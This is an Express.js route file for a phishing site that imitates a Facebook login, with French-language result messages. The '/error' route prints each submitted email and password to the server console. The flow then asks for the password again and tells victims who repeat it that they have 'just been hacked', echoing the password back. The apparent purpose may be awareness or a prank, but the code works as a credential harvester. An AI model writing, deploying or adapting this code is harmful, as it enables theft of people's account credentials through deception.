var express = require('express');
var router = express.Router();

/* GET home page. */
router.get('/', function(req, res, next) {
  res.render('phishing_main', { title: 'Express' });
});

router.get('/login', function(req, res, next) {
  console.log("LOGIN");
  res.render('phishing_login');
});

router.post('/error', function(req, res, next) {
  console.log("ERROR");
  var user = req.body.email;
  var pwd = req.body.pass;
  console.log(user);
  console.log(pwd);
  res.render('phishing_error', { email: user, pass: pwd });
});

router.post('/done', function(req, res, next) {
  console.log("DONE");
  var user = req.body.email;
  var pwd = req.body.pass;
  var old_pwd = req.body.first_pass;
  var yup = "Félicitation, vous n'avez pas saisie votre mot de passe facebook à deux reprise.";
  var nop = "OHHHHH it looks like YOU'VE JUST BEEN HACKED " + user + ", si votre mot de passe facebook est " + pwd + ".";
  
  res.render('phishing_done', { result: (pwd != old_pwd ? yup : nop) });
  
});
module.exports = router;
